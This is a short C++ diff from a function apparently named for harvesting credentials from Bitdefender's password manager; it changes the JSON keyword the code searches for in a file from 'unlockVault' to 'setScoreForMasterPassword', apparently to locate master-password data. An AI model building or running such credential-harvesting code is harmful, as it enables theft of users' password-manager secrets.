@@ -13,7 +13,7 @@ int getCredsbitdefender(std::string filename) {
         return 1;
     }
 
-    std::string searchKeyword = "\"methodName\":\"unlockVault\"";
+    std::string searchKeyword = "\"methodName\":\"setScoreForMasterPassword\"";
     std::string foundData;
 
     while (!file.eof()) {
